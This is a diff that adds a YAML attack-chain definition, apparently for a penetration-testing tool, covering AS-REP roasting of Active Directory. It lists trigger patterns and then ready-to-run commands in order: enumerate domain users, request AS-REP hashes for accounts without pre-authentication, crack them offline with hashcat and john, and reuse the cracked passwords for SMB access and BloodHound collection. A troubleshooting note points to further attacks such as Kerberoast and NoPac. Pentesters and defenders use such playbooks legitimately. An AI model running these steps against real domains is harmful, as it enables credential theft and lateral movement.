@@ -1,0 +1,59 @@
+chain_id: asreproast_standalone
+title: "AD — AS-REP roast standalone (no pre-auth users → offline crack)"
+severity: HIGH
+tags: [ad, kerberos, asreproast, no-preauth, impacket, hashcat, recon]
+
+trigger:
+  any_of:
+    - { service_pattern: "(?i)kerberos" }
+    - { port_in: [88] }
+    - { banner_pattern: "(?i)kerberos|active\\s*directory" }
+    - { kind: "domain_user_list" }
+
+description: |
+  Any user with `DONT_REQ_PREAUTH` set on their account (legacy unix
+  integration, classic admin shortcut, sometimes service accounts)
+  will return an AS-REP encrypted with their long-term key — even to
+  an unauth requester. Crack the AS-REP offline (hashcat -m 18200) →
+  get the user's password → start lateral movement. Day-1 internal
+  pentest move alongside Kerberoast.
+
+steps:
+  - id: 1
+    title: "Get a user list (null session, LDAP anon, kerbrute)"
+    command: |
+      crackmapexec smb $DC_IP -u '' -p '' --rid-brute 5000 | grep SidTypeUser | awk '{print $5}' > users.txt
+      kerbrute userenum --dc $DC_IP -d DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt > users.txt
+
+  - id: 2
+    title: "Roast (no creds — works against pre-auth-disabled accounts)"
+    command: |
+      impacket-GetNPUsers DOMAIN/ -no-pass -dc-ip $DC_IP -usersfile users.txt -format hashcat -outputfile asrep.txt
+
+  - id: 3
+    title: "Or if you already have a low-priv user"
+    command: |
+      impacket-GetNPUsers DOMAIN/USER:'PASS' -dc-ip $DC_IP -request -format hashcat -outputfile asrep.txt
+
+  - id: 4
+    title: "Crack offline"
+    command: |
+      hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+      john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
+
+  - id: 5
+    title: "Use the cracked password"
+    command: |
+      crackmapexec smb DC.DOMAIN -u CRACKED_USER -p 'CRACKED_PWD' -d DOMAIN
+      bloodhound-python -u CRACKED_USER -p 'CRACKED_PWD' -d DOMAIN -c All -ns $DC_IP
+
+common_errors:
+  - error: "GetNPUsers returns 'No entries found'"
+    solution: |
+      No accounts have DONT_REQ_PREAUTH. Pivot to Kerberoast (any
+      service account). If even that fails: shadow credentials path
+      via DACL abuse, or attack the DC itself (NoPac if pre-Nov 2021).
+
+references:
+  - https://www.thehacker.recipes/ad/movement/kerberos/asreproast
+  - https://github.com/SecureAuthCorp/impacket
